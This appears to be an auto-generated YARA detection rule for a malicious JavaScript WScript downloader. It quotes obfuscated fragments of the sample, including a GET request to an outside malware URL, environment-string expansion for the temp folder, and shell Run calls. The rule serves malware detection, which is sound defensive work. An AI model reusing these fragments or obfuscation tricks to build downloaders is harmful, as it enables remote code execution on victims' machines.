rule sig_20160428_fc81b9b7c4d12444fe232ed51ef05f9a {
  meta:
    description = "datamaliciousorder - file 20160428_fc81b9b7c4d12444fe232ed51ef05f9a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1ee40f71aa185837f75c356947e48fb98b4c7cbbe561ffb8bbb20fcd7f84544c"

  strings:
    $s1  = "VuoOgoGskNwzRfsPywAqa[UzjDxtHwvVioZkmZnqRjy](\"G\" + \"ET\", \"http://rabitaforex.com/pw3ksl\", false);" fullword ascii
    $s2  = "function DddAuqYfpGxnYtrDbaJyf() {return YpqIqtVzlHzkQdzIljLcy[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function MndRgvMplIbnUomZcePiz(DswPeiHipRvnCbgJhaLao){YpqIqtVzlHzkQdzIljLcy[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function MndRgvMplIbnUomZcePiz(DswPeiHipRvnCbgJhaLao){YpqIqtVzlHzkQdzIljLcy[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "if (VuoOgoGskNwzRfsPywAqa[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s6  = "return UazGkaWabNweNxfLulPgm - PnfVnoPgwOznRosGgjXqr;};" fullword ascii
    $s7  = "function FfiUfeDuuNafYftFplNvh(UazGkaWabNweNxfLulPgm, PnfVnoPgwOznRosGgjXqr){MqtDthDuwBtdCuvUyuIhl = MqtDthDuwBtdCuvUyuIhl * 1; " ascii
    $s8  = "var MxdBgdAnqBoiSzlKssLwa = this[\"WScript\"];" fullword ascii
    $s9  = "function DddAuqYfpGxnYtrDbaJyf() {return YpqIqtVzlHzkQdzIljLcy[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function FfiUfeDuuNafYftFplNvh(UazGkaWabNweNxfLulPgm, PnfVnoPgwOznRosGgjXqr){MqtDthDuwBtdCuvUyuIhl = MqtDthDuwBtdCuvUyuIhl * 1; " ascii
    $s11 = "var YpqIqtVzlHzkQdzIljLcy = function IzgPcuAmgCapEmpYicZhd() {return MxdBgdAnqBoiSzlKssLwa[HzyApqMsdWeeZtxQzuZnr](\"WScript\"+\"" ascii
    $s12 = "function YrjWdrAufDfjRuiGaoBqz(){return EfgEghEifXrhRtuZoqOuh + \"\";};" fullword ascii
    $s13 = "function CdsDscCbxNsvLpkNssMhx() {return ((OveFlfHmnPcbXzlFunEkc == true) && (OveFlfHmnPcbXzlFunEkc == RdmYvsKobTypFdxOhwRzv)) ?" ascii
    $s14 = "function CdsDscCbxNsvLpkNssMhx() {return ((OveFlfHmnPcbXzlFunEkc == true) && (OveFlfHmnPcbXzlFunEkc == RdmYvsKobTypFdxOhwRzv)) ?" ascii
    $s15 = "var YpqIqtVzlHzkQdzIljLcy = function IzgPcuAmgCapEmpYicZhd() {return MxdBgdAnqBoiSzlKssLwa[HzyApqMsdWeeZtxQzuZnr](\"WScript\"+\"" ascii
    $s16 = "var QyzIyrPfoOvjIsaYawWbo = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "HqlVumQrpVraUywRnlOmy = true;" fullword ascii
    $s18 = "var HqlVumQrpVraUywRnlOmy = false;" fullword ascii
    $s19 = "function FohObrYfkGcfInvCmjIut(EqfKupNavTxdMthAlnVys) {var MzfOlgBvxPzfShxSutVff = (1, 2, 3, 4, 5, EqfKupNavTxdMthAlnVys); retur" ascii
    $s20 = "OveFlfHmnPcbXzlFunEkc = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}